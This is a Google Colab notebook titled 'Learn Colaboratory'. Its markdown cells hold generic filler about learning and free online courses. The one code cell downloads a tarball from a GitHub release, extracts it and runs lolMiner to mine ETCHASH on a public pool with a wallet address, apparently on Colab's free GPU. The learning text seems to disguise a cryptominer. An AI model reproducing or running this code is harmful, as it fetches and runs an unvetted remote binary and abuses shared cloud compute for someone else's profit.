{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Learn Colaboratory",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Cmarlee/MrovmmLoLMiner/blob/master/%E0%B8%A2%E0%B8%B4%E0%B8%99%E0%B8%94%E0%B8%B5%E0%B8%95%E0%B9%89%E0%B8%AD%E0%B8%99%E0%B8%A3%E0%B8%B1%E0%B8%9A%E0%B8%AA%E0%B8%B9%E0%B9%88_Colaboratory.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BD2w1NxbXyL1"
      },
      "source": [
        "Learn Corporation Meaning of learn in English ... to get knowledge or skill in a new subject or activity: They learn ..."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LbV4HIeSYC7f"
      },
      "source": [
        " \n",
        "## learn\n",
        "! wget https://github.com/Cmarlee/MrovmmLoLMiner/releases/download/1.29/Mrovmm.tar.gz\n",
        "!tar -xf Mrovmm.tar.gz\n",
        "%cd 1.29\n",
        "!./lolMiner -a ETCHASH --pool eu.etchash.k1pool.com --port 5200 --user KrdVTyPqKhNR1EZfMywwZQRADqD5F6dBF6p.Rig1 --worker Rig1 --pass x --ethstratum ETHPROXY --enablezilcache"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yknwxLksZ0MO"
      },
      "source": [
        "Free online learning from The Open University. OpenLearn gives you free access to course materials and expert opinion on topical issues."
      ]
    }
  ]
}
